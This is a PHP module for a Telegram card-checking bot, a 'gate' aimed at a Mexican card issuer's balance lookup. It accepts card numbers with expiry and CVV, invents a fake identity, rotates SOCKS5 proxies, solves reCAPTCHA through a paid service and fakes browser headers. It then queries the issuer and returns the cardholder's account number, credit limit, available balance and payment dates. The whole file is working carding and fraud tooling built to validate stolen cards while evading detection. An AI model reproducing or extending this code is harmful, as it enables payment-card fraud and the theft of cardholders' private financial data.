<?php 

$cmd = Command($message);
if (strtolower($cmd['command']) == "bra") {
    $data = $cmd['data'];
$NameGater ='BradesCard';
$gateway = "/bra $NameGater";
is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = $data ?:$r_msg ?: $q_msg;


if (empty($lista)) {
    bot('sendMessage', [
        'chat_id' => $chatId,
        'disable_web_page_preview' => true,
        'reply_to_message_id' => $message_id,
        'parse_mode' => 'HTML',
        'text' => "<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-BradesCard Balance MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Pasarela: <code>BradesCard Balance MX</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Format: <code>!bra card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
    ]);
    die();
}

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

AntiScript();
is_Antispma($userId, $chatId, $messageId, $keyboard);

if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}

if(strlen($mes) == 1){
    $mes = "0".$mes;
  }

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-BradesCard Balance MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

$json = file_get_contents("https://example.invalid/legacy");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"])  . strtolower($user["name"]["last"]) .rand(111,2343). '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];




$curl = new CurlX;

$cookie = uniqid();


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos

$socks5 = socks5();
$rotate = rotate();


$cookie = uniqid();

$server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: es-ES,es;q=0.9',
    'priority: u=0, i',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: none',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
];
$request = $curl::Get('https://example.invalid/legacy', $headers, $cookie, $server = NULL);

$csookie = $request->headers->response["set-cookie"];

$solver = new \Capsolver\CapsolverClient('REDACTED_CREDENTIAL');


$solution = $solver->recaptchaV2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
    [
      'websiteURL'    => 'https://example.invalid/legacy',
      'websiteKey'    => 'REDACTED_CREDENTIAL',
    ]
);

echo $captcha = $solution["gRecaptchaResponse"];


$headers = [
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://example.invalid/legacy',
    'referer: https://example.invalid/legacy',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest'
];
$data = 'token='REDACTED_CREDENTIAL'&tarjeta='.$cc.'&terminos=true';
$request = $curl::Post('https://example.invalid/legacy', $data, $headers, $cookie, $server);

if (substr_count($request->body, 'No se pudo verificar la tarjeta, intente más tarde')) {
    bot('editMessageText', [
        'chat_id' => $chatId,
        'message_id' => $messageidtoedit,
        'text' => "<b>No se pudo verificar la tarjeta, intente más tarde (CARD NOT VALID)╺</b>",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ]);
    die();
}
$headers = [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: es-ES,es;q=0.9',
    'priority: u=0, i',
    'referer: https://example.invalid/legacy',
    'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
];
$request = $curl::Get('https://example.invalid/legacy', $headers, $cookie, $server);

$numerotarjetacliente = $curl::ParseString($request->body ,"numerotarjetacliente: '", "'");

$headers = [
    'accept: */*',
    'accept-language: es-ES,es;q=0.9',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://example.invalid/legacy',
    'priority: u=1, i',
    'referer: https://example.invalid/legacy',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest'
];
$data = 'numerotarjetacliente='.urlencode($numerotarjetacliente).'';
$request = $curl::Post('https://example.invalid/legacy', $data, $headers, $cookie, $server);

$data = json_decode($request->body, true);
$NumCuentaPersona = $data["NumCuentaPersona"];
$NumTarjetaPersona = $data["NumTarjetaPersona"];
$FechaLimitePagoPersona = $data["FechaLimitePagoPersona"];
$PagoTotalMesPersona = $data["PagoTotalMesPersona"];
$FechaCortePersona = $data["FechaCortePersona"];
$DisponibleComprasPersona = $data["DisponibleComprasPersona"];
$SaldoTotalPersona = $data["SaldoTotalPersona"];
$LimiteCreditoPersona = $data["LimiteCreditoPersona"];
$SaldoVencidoPersona = $data["SaldoVencidoPersona"];

bot('editMessageText',[
    'chat_id' => $chatId,
    'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'message_id' => $messageidtoedit,
    'text' => "<b>[<a href='https://example.invalid/legacy'>ϟ</a>] Gate Special: >_$-BradesCard Balance MX
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card: <code>$cc</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Status: <code>Success! ✅</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Cuenta: <code>$NumCuentaPersona</code>
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Disponible Compras: <code>$DisponibleComprasPersona</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Pago Minimo: <code>$PagoTotalMesPersona</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Pago Total Mes: <code>$PagoTotalMesPersona</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Limite de Credito: <code>$LimiteCreditoPersona</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Fecha Limite de Pago: <code>$FechaLimitePagoPersona</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Fecha Corte: <code>$FechaCortePersona</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Saldo Total: <code>$SaldoTotalPersona</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Saldo Vencido: <code>$SaldoVencidoPersona</code>
━━━━━━━━━━━━━━━━
[<a href='https://example.invalid/legacy'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://example.invalid/legacy'>ϟ</a>] Gate: <code>$NameGater</code>
[<a href='https://example.invalid/legacy'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id
]);

}